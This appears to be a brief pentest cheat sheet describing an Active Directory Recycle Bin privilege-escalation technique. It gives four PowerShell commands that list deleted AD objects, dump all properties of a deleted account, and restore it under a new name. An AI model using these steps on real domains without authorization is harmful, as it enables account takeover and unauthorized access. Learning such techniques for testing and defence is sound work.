---
title: "AD Recycle Bin"
date: 2024-7-13
tags: ["ad recycle bin", "active driectory", "ad", "Windows"]
---

---
### Privesc #1: Restore deleted AD account

#### 1. Import AD module

```powershell
import-module activedirectory
```

#### 2. Query all deleted objects within domain

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

#### 3. Get all details for the deleted account

```powershell
Get-ADObject -filter { SAMAccountName -eq "<DELETED_USER>" } -includeDeletedObjects -property *
```

#### 4. Restore deleted account

```powershell
# Rename the target account to avoid user exist error
Restore-ADObject -Identity <ObjectGUID> -NewName <NEW_USER> -TargetPath "CN=Users,DC=<EXAMPLE>,DC=<COM>"
```

<br>